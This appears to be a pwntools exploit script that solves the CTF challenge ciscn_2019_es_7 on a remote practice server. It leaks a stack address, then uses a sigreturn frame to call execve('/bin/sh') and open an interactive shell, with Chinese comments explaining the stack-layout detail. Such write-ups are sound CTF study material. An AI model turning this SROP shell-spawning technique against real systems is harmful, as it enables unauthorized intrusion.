from pwn import *
context(os='linux', arch='amd64', log_level='debug')
elf = ELF('./ciscn_2019_es_7')
# io = process('./ciscn_2019_es_7')
io = remote('node4.buuoj.cn',29976)

sigret = 0x4004da
syscall_ret = 0x400517
vul_addr = 0x4004F1 #注意这里前两行不能用push rbp和mov rbp，原因见下面
offset = 0x7fffffffdde8 - 0x7fffffffdcd0

payload = b'/bin/sh\x00'*2 + p64(vul_addr)
io.sendline(payload)
io.recv(0x20) #前0x20字节没有用
bin_sh = u64(io.recv(8)) - offset


frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = bin_sh
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_ret

# payload2 = flat(['a'*0x10,sigret,syscall_ret,frame])
# main_addr = 0x4004F1
# 终于测试好了，为什么两个wp里面payload2和main_addr不一样但都可以
# 因为如果用main_addr = 0x4004ED会再一次执行push rbp和mov rbp，rsp也就改变了栈的位置
# 第一次写入的bin_sh位置发生了改变，所以payload2要再写一次，位置和第一次相同
# 反之如果想用第一次的bin_sh就不能要main_addr开始处的两个栈操作


payload2 = flat(['/bin/sh\x00'*2, sigret, syscall_ret, frame])
io.sendline(payload2)
io.interactive()
